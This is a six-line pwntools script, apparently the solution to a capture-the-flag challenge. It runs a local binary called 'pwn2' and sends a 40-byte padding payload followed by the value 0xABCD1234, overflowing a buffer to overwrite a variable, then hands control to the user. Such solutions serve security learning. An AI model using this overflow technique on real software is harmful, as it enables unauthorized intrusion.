from pwn import *

p=process("./pwn2")
payload=(0x34-0xC)*"a"+p32(0xABCD1234)
p.sendline(payload)
p.interactive()